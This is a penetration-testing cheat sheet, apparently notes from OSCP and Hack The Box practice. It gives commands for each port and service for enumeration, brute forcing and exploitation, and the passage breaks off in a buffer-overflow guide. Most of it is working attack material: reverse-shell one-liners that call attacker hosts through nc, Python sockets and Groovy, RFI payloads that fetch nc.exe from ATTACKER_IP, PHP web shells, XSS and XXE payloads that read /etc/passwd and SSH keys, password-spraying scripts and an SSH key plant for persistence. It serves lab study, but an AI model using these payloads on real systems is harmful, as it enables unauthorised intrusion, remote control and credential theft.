nmap --script smb-enum-*,smb-vuln-*,smb-ls.nse,smb-mbenum.nse,smb-os-discovery.nse,smb-print-text.nse,smb-psexec.nse,smb-security-mode.nse,smb-server-stats.nse,smb-system-info.nse,smb-protocols -p 139,445 10.11.1.111

nmap --script smb-vuln* -p 445 <X.X.X.X> -Pn

nmap --script smb-enum-domains.nse,smb-enum-groups.nse,smb-enum-processes.nse,smb-enum-sessions.nse,smb-enum-shares.nse,smb-enum-users.nse,smb-ls.nse,smb-mbenum.nse,smb-os-discovery.nse,smb-print-text.nse,smb-psexec.nse,smb-security-mode.nse,smb-server-stats.nse,smb-system-info.nse,smb-vuln-conficker.nse,smb-vuln-cve2009-3103.nse,smb-vuln-ms06-025.nse,smb-vuln-ms07-029.nse,smb-vuln-ms08-067.nse,smb-vuln-ms10-054.nse,smb-vuln-ms10-061.nse,smb-vuln-regsvc-dos.nse -p 139,445 10.11.1.111

enum4linux -a 10.11.1.111


# RPC

rpcclient -U "" 10.11.1.111
    srvinfo
    enumdomusers
    getdompwinfo
    querydominfo
    netshareenum
    netshareenumall


# SMB Client

smbclient -L 10.11.1.111
smbclient -N -L //10.11.1.111
smbclient //10.11.1.111/tmp
smbclient \\\\10.11.1.111\\ipc$ -U john
smbclient //10.11.1.111/ipc$ -U john  

# SMB Client UI

nautilus smb://<ip-victim>

# Recursive Enumeration Inside of SMBClient

smb: \> recurse on                                                                                                                   
smb: \> ls  


# Download a Complete Resource

smbget -R  smb://10.10.10.178/Data/ -U TempUser


# Access to Resource

- Path of resource: /example/<resource>

smb: \> cd example
NT_STATUS_ACCESS_DENIED

smb: \> cd example/<resource>
ACCESS OK


# Users Enumeration & Login

msf5 > use auxiliary/scanner/smb/smb_login
msf5 > use auxiliary/scanner/smb/smb_enumusers


# Search Vulnerabilities

searchsploit <Samba version>



winexe -U username //10.11.1.111 "cmd.exe" --system

smbtree 10.11.1.111

nmblookup -A 10.11.1.111

smbmap -H <ip-victim>
smbmap -u victim -p s3cr3t -H 10.11.1.111

Inside \Policies\{REG}\MACHINE\Preferences\Groups\Groups.xml can found user and passwrod, decrypt with "gpp-decrypt "

# Mount SMB in Linux

mount -t cifs -o username=user,password=password //10.11.1.111/share /mnt/share
```

### Port 161/162 UDP - SNMP

```text
nmap -vv -sV -sU -Pn -p 161,162 --script=snmp-netstat,snmp-processes 10.11.1.111
snmp-check 10.11.1.111 -c public|private|community
```

### LDAP - 389,636

```text
ldapsearch -h 10.11.1.111 -p 389 -x -b "dc=mywebsite,dc=com"
ldapsearch -x -h 10.11.1.111 -D 'DOMAIN\user' -w 'hash-password'
ldapdomaindump 10.11.1.111 -u 'DOMAIN\user' -p 'hash-password'
patator ldap_login host=10.10.1.111 1=/root/Downloads/passwords_ssh.txt user=hsmith password=FILE1 -x ignore:mesg='Authentication failed.'
```

### HTTPS - 443

Read the actual SSL CERT to:

* find out potential correct vhost to GET
* is the clock skewed
* any names that could be usernames for bruteforce/guessing.

```text
sslscan 10.11.1.111:443
./testssl.sh -e -E -f -p  -S -P -c -H -U TARGET-HOST > OUTPUT-FILE.html
nmap -sV --script=ssl-heartbleed 10.1.10.111
mod_ssl,OpenSSL version Openfuck
```

### 500 - ISAKMP IKE

```text
ike-scan 10.11.1.111
```

### 513 - Rlogin

```text
apt install rsh-client
rlogin -l root 10.11.1.111
```

### 541 - FortiNet SSLVPN

[Fortinet Ports Guide](https://help.fortinet.com/fos50hlp/54/Content/FortiOS/fortigate-ports-and-protocols-54/Images/FortiGate.png)

[SSL VPN Leak](https://opensecurity.global/forums/topic/181-fortinet-ssl-vpn-vulnerability-from-may-2019-being-exploited-in-wild/?__cf_chl_jschl_tk__=42e37b31a0585f7dae3dbce18cafde7c39b81976-1578385705-0-AcuYzrPMO1OuMo59JSPYyzZjiXNbMAIl6sKiXwhQRbMUMZq1Kp3VmWqIVXWZdzTZgFCecXue1Z6xXxU-Rql_GT_ovKiar_-i0CUCKFS85bfNXnUzuOuIwomXje-kH87mNbVHzzh9ediRfVWbJjwtO-ttLEYi7quczLlHQk38UqcumrARs77RrK2mj9zOb8Uwhv6av4QZ9od4fgAIl-F4Kff26MPQjs4LRHsgk5zH6RVwFMP8NdOnCrrzkkGH6_R9Dtw89_QtiOsH1nKB0hBDbtJ2O9AkkMDqw7tl1ip_pVDfnw1lvaZtFq1sRqgYwpan-n6n9f58Xdjcj2UGFKdE32OS7Ete8X7RwXUV9FGUSOhAM5_iK0kMNJg3mskrFVQz0lONaZVvFRdf_1rp69J4oRVat1m7KIQEGpRDe4OvYUb7pfQkNKLcK5s_lVIj2SAJQQ)

### Port 554 - RTSP

* Web interface, transfer images, streaming

### Port Rsync - 873/8730

```text
=== List modules availables ===

rsync --list-only -a rsync://[<ip_victim>]:8730/
rsync rsync://[<ip_victimz>]:8730


=== List single module ===

rsync --list-only -a rsync://[<ip_victim>]:8730/<module>
rsync rsync://[<ip_victimz>]:8730/<module>

NOTE: Check some interesting directories

rsync rsync://[<ip_victimz>]:8730/etc
rsync rsync://[<ip_victimz>]:8730/var
rsync rsync://[<ip_victimz>]:8730/etc/passwd
rsync rsync://[<ip_victimz>]:8730/etc/rsync*
rsync rsync://[<ip_victimz>]:8730/rsyncd.secrets

=== Synchronize files locally (download) ===

rsync -q -r rsync://[<ip_victim>]:8730/etc/* .
rsync -q -r rsync://roy@[<ip_victim>]:8730/home_roy .

=== Connect like a User ===

rsync rsync://[<ip_victim>:8730/home_roy
rsync --list-only rsync://<username>@[<ip_victim>]:8730/home_roy

=== Script for bruteForce password on Rsync with specific directory ===

#!/bin/bash

for p in $(cat /usr/share/wordlists/rockyou.txt)
do
    sshpass -p $p rsync -q rsync://roy@[<Ipv6>]:8730/home_roy 2>/dev/null
    if [[ $? -eq 0 ]]
    then
        echo "Found password: $p"
        exit
    fi
done

=== Upload SSH Key ===

1) Create in your attacker machine a pair of keys SSH
    ssh-keygen

2) Create a directory
    mkdir .ssh

3) Create a file "authorized_keys" with your id_rsa.pub
    nano authorized_keys (and paste your id_rsa.pub inside)

4) Run
    rsync -aR .ssh/ rsync://roy@[<ip_victim>]:8730/home_roy/

5) Connect with SSH
    ssh -i id_rsa roy@<ip_victim>

Reference: zetta box (htb)
```

### Port 1030/1032/1033/1038

Used by RPC to connect in domain network.

### MSSQL - 1433

```text
nmap -p 1433 -sU --script=ms-sql-info.nse 10.11.1.111
use auxiliary/scanner/mssql/mssql_ping
use auxiliary/scanner/mssql/mssql_login
use exploit/windows/mssql/mssql_payload
sqsh -S 10.11.1.111 -U sa
    xp_cmdshell 'date'
      go
```

### Port 1521 - Oracle

```text
oscanner -s 10.11.1.111 -P 1521
tnscmd10g version -h 10.11.1.111
tnscmd10g status -h 10.11.1.111
nmap -p 1521 -A 10.11.1.111
nmap -p 1521 --script=oracle-tns-version,oracle-sid-brute,oracle-brute
MSF: good modules under auxiliary/admin/oracle and scanner/oracle

./odat-libc2.5-i686 all -s 10.11.1.111 -p 1521
./odat-libc2.5-i686 sidguesser -s 10.11.1.111 -p 1521
./odat-libc2.5-i686 passwordguesser -s 10.11.1.111 -p 1521 -d XE

Upload reverse shell with ODAT:
./odat-libc2.5-i686 utlfile -s 10.11.1.111 -p 1521 -U scott -P tiger -d XE --sysdba --putFile c:/ shell.exe /root/shell.exe

and run it:
./odat-libc2.5-i686 externaltable -s 10.11.1.111 -p 1521 -U scott -P tiger -d XE --sysdba --exec c:/ shell.exe
```

### Port 2049 - NFS

```text
showmount -e 10.11.1.111

If you find anything you can mount it like this:

1)

- mkdir nfs2

2)
- mount -t nfs <ip_victim>:<path_remote_found> <path_local_for_mount>
- mount <ip_victim>:/ /tmp/NFS
- mount -t <ip_victim>:/ /tmp/NFS
```

### Port 2100 - Oracle XML DB

```text
FTP:
    sys:sys
    scott:tiger
```

Default passwords [https://docs.oracle.com/cd/B10501\_01/win.920/a95490/username.htm](https://docs.oracle.com/cd/B10501_01/win.920/a95490/username.htm)

### 3306 - MySQL

```text
nmap --script=mysql-databases.nse,mysql-empty-password.nse,mysql-enum.nse,mysql-info.nse,mysql-variables.nse,mysql-vuln-cve2012-2122.nse 10.11.1.111 -p 3306

mysql --host=10.11.1.111 -u root -p

MYSQL UDF 
https://www.adampalmer.me/iodigitalsec/2013/08/13/mysql-root-to-system-root-with-udf-for-windows-and-linux/
```

Credentials Gathering Script

```text
You get a "username", "Database", "Challenge" and "Response" (the two last is the password)
use auxiliary/server/capture/mysql (when you can control that a DB connect to you own server)
```

Basic Commands

```text
mysql -u root
create database [DB_NAME];
create user '[USER_NAME]' identified by '[PASSWORD]'
grant all privileges on [DB_NAME].* to '[USER_NAME]'@'%';
flush privileges;
show databases;
use [DB_NAME]
show tables;

create table [TABLE_NAME] ( [COLUMN_01_NAME] varchar(32), [COLUMN_02_NAME] varchar(32) );

insert into [TABLE_NAME] values( '[VALUE_COLUMN_01_NAME]', '[VALUE_COLUMN_02_NAME]' ):

(See "kryptos" box in htb for referencies)
```

### Port 3339 - Oracle web interface

* Basic info about web service \(apache, nginx, IIS\)

### RDP - 3389

```text
nmap -p 3389 --script=rdp-vuln-ms12-020.nse
rdesktop -u username -p password -g 85% -r disk:share=/root/ 10.11.1.111
rdesktop -u guest -p guest 10.11.1.111 -g 94%
ncrack -vv --user Administrator -P /root/oscp/passwords.txt rdp://10.11.1.111
```

### VNC - 5900

```text
nmap --script=vnc-info,vnc-brute,vnc-title -p 5900 10.11.1.111

# Connect to VNC

vncviewer <ipVictim>:<portVictim> -passwd <file_password>

vncviewer localhost:4444 -passwd secret (SSH tunneling done previously)

Reference: poison box (htb)
```

### WinRM - 5985

```text
https://github.com/Hackplayers/evil-winrm
gem install evil-winrm
evil-winrm -i 10.11.1.111 -u Administrator -p 'password1'
evil-winrm -i 10.11.1.111 -u Administrator -H 'hash-pass' -s /scripts/folder
```

### Redis - 6379

```text
https://github.com/Avinash-acid/Redis-Server-Exploit
python redis.py 10.10.10.160 redis
```

### Port 6697 - IRC

```text
# Connect with netcat

nc <ip-victim> <port>

# Inject payload

nc 10.10.10.117 6697

AB; rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bin/sh -i 2>&1|nc 10.10.14.4 1234 >/tmp/f

# And in your listenet get the reverse shell

nc -lnvp 1234
connect to ...

Reference: irked box (htb)
```

### MsDeploy - 8172

```text
Microsoft IIS Deploy port
IP:8172/msdeploy.axd
```

### Port 11211 - Memcached

```text
    ####################
    ### Explore this ###
    ####################

======================
=== Test Open Port ===
======================

cgonzalo@cgonzalo:# nmap -Pn -sT -sV -p11211 <host>

===============================
=== Inside of a Victim Host ===
===============================

user@user:# service memcached status

user@user:#telnet localhost 11211
    > version
    > stats
    > stats slabs
    > stats items
    > stats cachedump 1 0
    > get <item01> (item01 = username, for example)
    > get <item02> (item02 = passwd, for example)

Reference: cache box (htb)
Resource: https://www.hackingarticles.in/penetration-testing-on-memcached-server/
```

### Webdav

```text
=========================
=== Connect to WebDAV ===
=========================

cadaver http://target/
cadaver http://10.10.10.67/webdav_test_inception/

================
=== Commands ===
================

dav:/webdav_test_inception/> help
dav:/webdav_test_inception/> put <shell>.php (Example: > put b374k.php)

===================
=== Scan WebDAV ===
===================

davtest -cleanup -url http://target

Resource: https://www.hackingarticles.in/multiple-ways-to-exploiting-put-method/
```

### Unknown ports

* `amap -d 10.11.1.111 8000`
* netcat: makes connections to ports. Can echo strings or give shells: `nc -nv 10.11.1.111 110`
* sfuzz: can connect to ports, udp or tcp, refrain from closing a connection,     using basic HTTP configurations
* Try zone transfer for subdomains: `dig axfr @10.11.1.111 hostname.box`, `dnsenum 10.11.1.111`, `dnsrecon -d domain.com -t axfr`

Try admin:admin, user:user

### Port 80 - Web server

* Basics:
  * Navigate && robots.txt
  * Headers
  * Source Code

```text
# Subdomains
https://github.com/infosec-au/altdns
https://github.com/OWASP/Amass
wfuzz -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -H "Host: FUZZ.host.com" --hc 200 --hw 356 -t 100 10.10.10.101
https://github.com/mrnfrancesco/yass

# Great search of subdomains:

root@kali# for domain in supersechosting.htb justanotherblog.htb pwnhats.htb rentahacker.htb; do echo ===${domain}===; wfuzz -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1mil-5000.txt -u http://10.10.10.155 -H "Host: FUZZ.$domain" --hh 81; done


# Nikto
nikto -h http://10.11.1.111

# Nikto with squid proxy
nikto -h 10.11.1.111 -useproxy http://10.11.1.111:4444

# CMS Explorer
cms-explorer -url http://10.11.1.111 -type [Drupal, WordPress, Joomla, Mambo]

# WPScan (vp = Vulnerable Plugins, vt = Vulnerable Themes, u = Users)
wpscan --url http://10.11.1.111
wpscan --url http://10.11.1.111 --enumerate vp
wpscan --url http://10.11.1.111 --enumerate vt
wpscan --url http://10.11.1.111 --enumerate u
wpscan -e --url https://url.com
wpscan --url https://X.X.X.X --disable-tls-checks -e
wpscan --url http://10.10.10.88/webservices/wp -e ap --plugins-detection mixed (AGGRESSIVE AND COMPLETE SCAN)

Check IP behing WAF:
https://IP.com/2020/01/22/discover-cloudflare-wordpress-ip/
pingback.xml:
<?xml version="1.0" encoding="iso-8859-1"?>
<methodCall>
<methodName>pingback.ping</methodName>
<params>
 <param>
  <value>
   <string>http://10.0.0.1/hello/world</string>
  </value>
 </param>
 <param>
  <value>
   <string>https://IP.com/2020/01/22/hello-world/</string>
  </value>
 </param>
</params>
</methodCall>

curl -X POST -d @pingback.xml https://ip.com/xmlrpc.php

Enum User:
for i in {1..50}; do curl -s -L -i https://ip.com/wordpress\?author=$i | grep -E -o "Location:.*" | awk -F/ '{print $NF}'; done

# Joomscan
joomscan -u  http://10.11.1.111 
joomscan -u  http://10.11.1.111 --enumerate-components

# Get header
curl -i 10.11.1.111

# Get options
curl -i -X OPTIONS 10.11.1.111

    # With PUT option enabled:

    nmap -p 80 10.1.10.111 --script http-put --script-args http-put.url='/test/rootme.php',http-put.file='/root/php-reverse-shell.php'

    curl -v -X PUT -d '<?php system($_GET["cmd"]);?>' http://10.1.10.111/test/cmd.php
    && http://10.1.10.111/test/cmd.php?cmd=python%20-c%20%27import%20socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((%210.1.10.111%22,443));os.dup2(s.fileno(),0);%20os.dup2(s.fileno(),1);%20os.dup2(s.fileno(),2);p=subprocess.call([%22/bin/sh%22,%22-i%22]);%27

# Get everything
curl -i -L 10.11.1.111
curl -i -H "User-Agent:Mozilla/4.0" http://10.11.1.111:8080

# Check for title and all links
curl 10.11.1.111 -s -L | grep "title\|href" | sed -e 's/^[[:space:]]*//'

# Look at page with just text
curl 10.11.1.111 -s -L | html2text -width '99' | uniq

# Check if it is possible to upload
curl -v -X OPTIONS http://10.11.1.111/
curl -v -X PUT -d '<?php system($_GET["cmd"]); ?>' http://10.11.1.111/test/shell.php

# Simple curl POST request with login data
curl -X POST http://10.11.1.11/centreon/api/index.php?action=authenticate -d 'username=centreon&password=wall'

dotdotpwn.pl -m http -h 10.11.1.111 -M GET -o unix

site:domain.com intext:user


# Firebase
https://github.com/Turr0n/firebase
python3 firebase.py -p 4 --dnsdumpster -l file
```

#### Url brute force

```text
# Ffuf
ffuf -c -e '.htm','.php','.html','.js','.txt','.zip','.bak','.asp','.aspx','xml','.log' -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -u https://10.11.1.11/mvc/FUZZ

# Dirb not recursive
dirb http://10.11.1.111 -r -o dirb-10.11.1.111.txt

# Dirb & Nikto with Proxy Server (Authentication required)
nikto -host 127.0.0.1 -useproxy http://10.10.10.21:3128
dirb http://127.0.0.1 <wordlist> -p 10.10.10.21:3128 -P kalamari:ihateseafood -r

Reference: joker box (htb)

# Evasion of BlackList with UserAgent

dirb http://10.10.10.58:3000/ -a "3v4s10n"

# Wfuzz
wfuzz -c -z file,/usr/share/wfuzz/wordlist/general/common.txt --hc 404 http://10.11.1.11/FUZZ
wfuzz -c --hc=403,404 -t 500 -w /usr/share/wordlists/dirb/big.txt -w extensions.txt http://10.10.10.56/FUZZ.FUZ2Z (two dictionaries, when you want fuzz a extension)

# GoBuster
gobuster dir -u http://10.11.1.111 -w /usr/share/seclists/Discovery/Web_Content/common.txt -s '200,204,301,302,307,403,500' -e
gobuster dir -e -u http://10.11.1.111/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
gobuster dir -u http://$10.11.1.111 -w /usr/share/seclists/Discovery/Web_Content/Top1000-RobotsDisallowed.txt
gobuster dir -e -u http://10.11.1.111/ -w /usr/share/wordlists/dirb/common.txt

dotdotpwn.pl -m http -h 10.11.1.111 -M GET -o unix

./dirsearch.py -u 10.10.10.157 -e php

medusa -h 10.11.1.111 -u admin -P wordlist.txt -M http -m DIR:/test -T 10

Crawl:

dirhunt https://url.com/
hakrwaler https://url.com/

Fuzzer:

ffuf -recursion -c -e '.htm','.php','.html','.js','.txt','.zip','.bak','.asp','.aspx','.xml' -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -u https://url.com/FUZZ

dirsearch -r -f -u https://crm.comprarcasa.pt --extensions=htm,html,asp,aspx,txt -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt --request-by-hostname -t 40

#IIS
#ViewState:
https://www.notsosecure.com/exploiting-viewstate-deserialization-using-blacklist3r-and-ysoserial-net/#PoC

#WebResource.axd:
https://github.com/inquisb/miscellaneous/blob/master/ms10-070_check.py

#ShortNames
https://github.com/irsdl/IIS-ShortName-Scanner
java -jar iis_shortname_scanner.jar 2 20 http://domain.es

#Jenkins
JENKINSIP/PROJECT//securityRealm/user/admin
JENKINSIP/jenkins/script

#Groovy RCE
def process = "cmd /c whoami".execute();println "${process.text}";
#Groovy RevShell
String host="localhost";
int port=8044;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();

# Joomscan
joomscan -u  http://10.11.1.111 
joomscan -u  http://10.11.1.111 --enumerate-components

# PHP bypass disable_functions and open_basedir
# Chankro
https://github.com/TarlogicSecurity/Chankro
python2 chankro.py --arch 64 --input rev.sh --output chan.php --path /var/www/html

# Cookies error padding:
# Get cookie structure
padbuster http://10.10.1.111/index.php xDwqvSF4SK1BIqPxM9fiFxnWmF+wjfka 8 -cookies "user=xDwqvSF4SK1BIqPxM9fiFxnWmF+wjfka" -error "Invalid padding"
# Get cookie for other user (impersonation)
padbuster http://10.10.1.111/index.php xDwqvSF4SK1BIqPxM9fiFxnWmF+wjfka 8 -cookies "user=xDwqvSF4SK1BIqPxM9fiFxnWmF+wjfka" -error "Invalid padding" -plaintext 'user=administratorme'
```

#### Default/Weak login

Search documentation for default passwords and test them

```text
site:webapplication.com password
```

```text
admin admin
admin password
admin <blank>
admin <servicename>
root root
root admin
root password
root <servicename>
<username if you have> password
<username if you have> admin
<username if you have> username
username <servicename>
```

#### LFI/RFI

```text
fimap -u "http://10.11.1.111/example.php?test="

# Ordered output
curl -s http://10.11.1.111/gallery.php?page=/etc/passwd

/root/Tools/Kadimus/kadimus -u http://10.11.1.111/example.php?page=

http://10.11.1.111/index.php?page=php://filter/convert.base64-encode/resource=/etc/passwd && base64 -d savefile.php

http://10.11.1.111/page=http://10.11.1.111/maliciousfile.txt%00 or ??page=php://filter/convert.base64-encode/resource=../config.php

../../../../../boot.ini

amap -d 10.11.1.111 8000

# LFI Windows
http://10.11.1.111/addguestbook.php?LANG=../../windows/system32/drivers/etc/hosts%00

# Contaminating log files
root@kali:~# nc -v 10.11.1.111 80
10.11.1.111: inverse host lookup failed: Unknown host
(UNKNOWN) [10.11.1.111] 80 (http) open
 <?php echo shell_exec($_GET['cmd']);?> 

http://10.11.1.111/addguestbook.php?LANG=../../xampp/apache/logs/access.log%00&cmd=ipconfig

# RFI:
http://10.11.1.111/addguestbook.php?LANG=http://10.11.1.111:31/evil.txt%00
Content of evil.txt:
<?php echo shell_exec("nc.exe 10.11.0.105 4444 -e cmd.exe") ?>

# PHP Filter:
http://10.11.1.111/index.php?m=php://filter/convert.base64-encode/resource=config

Read the code of PHP file:
http://127.0.0.1/dev/index.php?view=php://filter/convert.base64-encode/[RESOURCE].php

https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion

# RFI over SMB (Windows)
cat php_cmd.php
    <?php echo shell_exec($_GET['cmd']);?>

- Start SMB Server in attacker machine and put evil script

- Access it via browser (2 request attack):

    - http://10.11.1.111/blog/?lang=\\ATTACKER_IP\ica\php_cmd.php&cmd=powershell -c Invoke-WebRequest -Uri "http://10.10.14.42/nc.exe" -OutFile "C:\\windows\\system32\\spool\\drivers\\color\\nc.exe"

    - http://10.11.1.111/blog/?lang=\\ATTACKER_IP\ica\php_cmd.php&cmd=powershell -c "C:\\windows\\system32\\spool\\drivers\\color\\nc.exe" -e cmd.exe ATTACKER_IP 1234
```

#### SQLi

```text
# References
https://www.exploit-db.com/papers/17934
https://pentestlab.blog/2012/12/24/sql-injection-authentication-bypass-cheat-sheet/

# Post
./sqlmap.py -r search-test.txt -p tfUPass

# Get
sqlmap -u "http://10.11.1.111/index.php?id=1" --dbms=mysql

# Crawl
sqlmap -u http://10.11.1.111 --dbms=mysql --crawl=3

# Full auto - THE GOOD ONE
sqlmap -u 'http://10.11.1.111:1337/978345210/index.php' --forms --dbs --risk=3 --level=5 --threads=4 --batch
# Columns 
sqlmap -u 'http://admin.cronos.htb/index.php' --forms --dbms=MySQL --risk=3 --level=5 --threads=4 --batch --columns -T users -D admin
# Values
sqlmap -u 'http://admin.cronos.htb/index.php' --forms --dbms=MySQL --risk=3 --level=5 --threads=4 --batch --dump -T users -D admin

sqlmap -o -u "http://10.11.1.111:1337/978345210/index.php" --data="username=admin&password=pass&submit=+Login+" --method=POST --level=3 --threads=10 --dbms=MySQL --users --passwords

# NoSQL
' || 'a'=='a
mongodbserver:port/status?text=1

#in URL
username[$ne]=toto&password[$ne]=toto

#in JSON
{"username": {"$ne": null}, "password": {"$ne": null}}
{"username": {"$gt":""}, "password": {"$gt":""}}

## SSRF

web that send request to external IP's, we call 127.0.0.1:8080 / 10.1.10.111 to enum internal network

chat:3000/ssrf?user=&comment=&link=http://127.0.0.1:3000
GET /ssrf?user=&comment=&link=http://127.0.0.1:3000 HTTP/1.1

Also we can enum ports
```

#### XSS Port 80

```text
<script>alert("XSS")</script>
<script>alert(1)</script>

https://www.noob.ninja/2017/11/local-file-read-via-xss-in-dynamically.html?m=1

" <script> x=new XMLHttpRequest; x.onload=function(){ document.write(this.responseText.fontsize(1)) }; x.open("GET","file:///home/reader/.ssh/id_rsa"); x.send(); </script>

" <script> x=new XMLHttpRequest; x.onload=function(){ document.write(this.responseText) }; x.open("GET","file:///etc/passwd"); x.send(); </script>

# XXE

XML entry that reads server, Doctype, change to entity "System "file:///etc/passwd""

Instead POST:

<?xml version="1.0" ?>
    <!DOCTYPE thp [
        <!ELEMENT thp ANY>
        <!ENTITY book "Universe">
    ]>
    <thp>Hack The &book;</thp>

Malicious XML:

<?xml version="1.0" ?><!DOCTYPE thp [ <!ELEMENT thp ANY>
<!ENTITY book SYSTEM "file:///etc/passwd">]><thp>Hack The
%26book%3B</thp>

XXE OOB

<?xml version="1.0"?><!DOCTYPE thp [<!ELEMENT thp ANY >
<!ENTITY % dtd SYSTEM "http://[YOUR_IP]/payload.dtd"> %dtd;]>
<thp><error>%26send%3B</error></thp>
```

#### Sql-login-bypass

* Open Burp-suite
* Make and intercept a request
* Send to intruder
* Cluster attack.
* Paste in sqlibypass-list \([https://bobloblaw.gitbooks.io/security/content/sql-injections.html](https://bobloblaw.gitbooks.io/security/content/sql-injections.html)\)
* Attack
* Check for response length variation

#### Bypass image upload restrictions

```text
- Change extension: .pHp3 or pHp3.jpg
- Modify mimetype: Content-type: image/jpeg
- Bypass getimagesize(): exiftool -Comment='<?php echo "<pre>"; system($_GET['cmd']); ?>' file.jpg
- Add gif header: 
    . GIF89a;

    . JFIF; <?php echo "<pre>"; system($_GET['cmd']); ?>

    . GIF89 <reverse_shell|shell>

    . echo '<?php' >> shell.php.png
      echo 'passthru("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.xx.xx 1337 >/tmp/f");' >> shell.php.png
      echo '?>' >> shell.php.png

- All at the same time.

###############################################
### What can you reach in case you uploaded ###
###############################################

01. ASP / ASPX / PHP5 / PHP / PHP3 --> WEBSHELL / RCE
02. SVG --> STORED XSS / SSRF
03. GIF --> STORED XSS
04. CSV --> CSV INJECTION
05. XML --> XXE
06. AVI --> LFI / SSRF
07. HTML / JS --> HTML INJECTION / XSS / OPEN REDIRECT
08. PNG / JPEG --> PIXEL FLOOD ATTACK
09. ZIP --> RCE VIA LFI
10. PDF / PPTX --> SSRF / BLIND XXE

https://twitter.com/RyouShin7/status/1281307217359224843/photo/1

```

#### CeWL

```text
# Use
cewl http://<victim>/<resource>.php -w <output>.wordlist
cewl http://10.10.10.101/secret.php -w secrets.wordlist
```

### Password brute force - last resort

Offline local resources

```text
# John: Crack SSH private key

1) /usr/share/john/ssh2john.py id_rsa > id_rsa.hash
2) john -wordlist=/usr/share/wordlists/rockyou.txt id_rsa.hash

# Other examples
cewl
hash-identifier
john --rules --wordlist=/usr/share/wordlists/rockyou.txt unshadowed.txt
medusa -h 10.11.1.111 -u admin -P password-file.txt -M http -m DIR:/admin -T 10
ncrack -vv --user offsec -P password-file.txt rdp://10.11.1.111
crowbar -b rdp -s 10.11.1.111/32 -u victim -C /root/words.txt -n 1
hydra -l root -P password-file.txt 10.11.1.111 ssh
hydra -P password-file.txt -v 10.11.1.111 snmp
hydra -l USERNAME -P /usr/share/wordlistsnmap.lst -f 10.11.1.111 ftp -V
hydra -l USERNAME -P /usr/share/wordlistsnmap.lst -f 10.11.1.111 pop3 -V
hydra -P /usr/share/wordlistsnmap.lst 10.11.1.111 smtp -V

# SIMPLE LOGIN GET
hydra -L cewl_fin_50.txt -P cewl_fin_50.txt 10.11.1.111 http-get-form "/~login:username=^USER^&password=^PASS^&Login=Login:Unauthorized" -V

# GET FORM with HTTPS
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.11.1.111 -s 443 -S https-get-form "/index.php:login=^USER^&password=^PASS^:Incorrect login/password\!"

# SIMPLE LOGIN POST
hydra -l root@localhost -P cewl 10.11.1.111 http-post-form "/otrs/index.pl:Action=Login&RequestedURL=&Lang=en&TimeOffset=-120&User=^USER^&Password=^PASS^:F=Login failed" -I

hydra -l <user> -P </path/of/passwords> <ip-victim > http-form-post "</path/to/fuzz:<variable1>:^USER^&password=^PASS^:Invalid Password" -t 64 -V

hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.10.43 http-form-post "/department/login.php:username=^USER^&password=^PASS^:Invalid Password" -t 64 -V

# SIMPLE LOGIN POST WITHOUT USER (https)

hydra -l none -P /usr/share/wordlists/rockyou.txt 10.10.10.43 https-form-post "/db/index.php:password=^PASS^&login=Log+In&proc_login=true:Incorrect password." -t 64 -V


# API REST LOGIN POST
hydra -l admin -P /usr/share/wordlists/wfuzz/others/common_pass.txt -V -s 80 10.11.1.111 http-post-form "/centreon/api/index.php?action=authenticate:username=^USER^&password=^PASS^:Bad credentials" -t 64

# Dictionary creation
https://github.com/LandGrey/pydictor
https://github.com/Mebus/cupp
git clone https://github.com/sc0tfree/mentalist.git
```

Online crackers

```text
https://hashkiller.co.uk/Cracker
https://www.cmd5.org/
https://www.onlinehashcrack.com/
https://gpuhash.me/
https://crackstation.net/
https://crack.sh/
https://hash.help/
https://passwordrecovery.io/
http://cracker.offensive-security.com/
```

## **Vulnerability analysis**

### BOF

```text
# BASIC GUIDE
1. Send "A"*1024
2. Replace "A" with /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l LENGTH
3. When crash "!mona findmsp" (E10.11.1.111 offset) or ""/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q TEXT" or "!mona pattern_offset eip"
4. Confirm the location with "B" and "C"
5. Check for badchars instead CCCC (ESP):
